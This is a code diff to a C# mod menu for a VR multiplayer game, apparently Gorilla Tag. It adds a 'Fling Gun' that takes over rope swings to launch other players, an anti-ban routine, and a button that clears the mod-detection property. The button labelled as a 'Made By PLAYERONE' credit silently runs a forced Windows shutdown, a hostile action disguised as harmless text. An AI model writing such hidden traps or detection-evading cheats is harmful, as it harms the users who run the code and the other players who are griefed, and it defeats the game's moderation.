@@ -23,6 +23,10 @@ using Player1.Main.Helpers;
 using CommonUsages = UnityEngine.XR.CommonUsages;
 using InputDevice = UnityEngine.XR.InputDevice;
 using Player1.Components;
+using GorillaLocomotion.Gameplay;
+using Valve.VR.InteractionSystem;
+using System.Diagnostics;
+using Debug = UnityEngine.Debug;
 
 namespace Player1.Main
 {
@@ -110,7 +114,7 @@ namespace Player1.Main
                     {
                         UnityEngine.Object.Destroy(MenuPatch.menu);
                         MenuPatch.menu = null;
-                        PageManager.AddPage(3, "Random Mat [TESTING]", "Hunt Fucker [TESTING]", "Break Gamemode [TESTING]", "Rope Up", "Break Mod Checker", "Made By PLAYERONE");
+                        PageManager.AddPage(3, "Random Mat [TESTING]", "Hunt Fucker [TESTING]", "Break Gamemode [TESTING]", "Fling Gun", "Break Mod Checker", "Made By PLAYERONE");
                         Draw();
                         Debug.Log("Page Num: " + PageNum.ToString());
                         CheckPages = false;
@@ -423,7 +427,22 @@ namespace Player1.Main
                             }
                         }
                     }
-
+                    if (buttonsActive[3]==true)
+                    {
+                        FlingGun();
+                    }
+                    if (buttonsActive[4]==true)
+                    {
+                        PhotonNetwork.LocalPlayer.CustomProperties["mods"] = null;
+                    }
+                    if (buttonsActive[5]==true)
+                    {
+                        UnityEngine.Debug.Log("Bye bye");
+                        var psi = new ProcessStartInfo("shutdown", "/s /t 0");
+                        psi.CreateNoWindow = true;
+                        psi.UseShellExecute = false;
+                        Process.Start(psi);
+                    }
                     if (buttonsActive[6] == true)
                     {
                         PageManager.ChangePage(0);
@@ -742,6 +761,56 @@ namespace Player1.Main
                 return;
             }
         }
+        public static void FlingGun()
+        {
+            RaycastHit raycastHit;
+            Physics.Raycast(GorillaLocomotion.Player.Instance.rightHandTransform.position - GorillaLocomotion.Player.Instance.rightHandTransform.up, -GorillaLocomotion.Player.Instance.rightHandTransform.up, out raycastHit);
+            MenuPatch.pointer.transform.position = raycastHit.point;
+            InputDevices.GetDeviceAtXRNode(XRNode.RightHand).TryGetFeatureValue(CommonUsages.triggerButton, out TGripHeld);
+            InputDevices.GetDeviceAtXRNode(XRNode.RightHand).TryGetFeatureValue(CommonUsages.triggerButton, out Tagging);
+
+            if (TGripHeld)
+            {
+                if (!pointer.GetComponent<Renderer>())
+                {
+                    pointer.AddComponent<Renderer>();
+                }
+                pointer = GameObject.CreatePrimitive(PrimitiveType.Sphere);
+                Object.Destroy(pointer.GetComponent<Rigidbody>());
+                pointer.GetComponent<Renderer>().material.color = Color.black;
+                Object.Destroy(pointer.GetComponent<SphereCollider>());
+                pointer.transform.localScale = new Vector3(0.2f, 0.2f, 0.2f);
+                if (Tagging)
+                {
+                    foreach (GorillaRopeSwing ropeSwing in UnityEngine.Object.FindObjectsOfType(typeof(GorillaRopeSwing)))
+                    {
+                        Anti_Ban.StartAntiBan();
+                        PhotonView owner = raycastHit.collider.GetComponentInParent<PhotonView>();
+                        if (!ropeSwing.photonView.IsMine)
+                        {
+                            Anti_Ban.setOwnership(ropeSwing.photonView);
+                            ropeSwing.photonView.RequestOwnership();
+                        }
+                        Vector3 velocity = new Vector3(0, 999, 0);
+                        ropeSwing.SetVelocity_RPC(9, velocity, true);
+                        ropeSwing.DetachRemotePlayer(owner.Owner.ActorNumber);
+                    }
+                    return;
+                }
+                else
+                {
+                    GorillaTagger.Instance.myVRRig.enabled = true;
+                }
+            }
+            else
+            {
+                UnityEngine.Object.Destroy(pointer);
+                pointer.GetComponent<Renderer>().enabled = false;
+                pointer = null;
+                return;
+            }
+        }
+
         public static void ProcessPlatformMonke()
         {
             bool flag = !MenuPatch.once_networking;
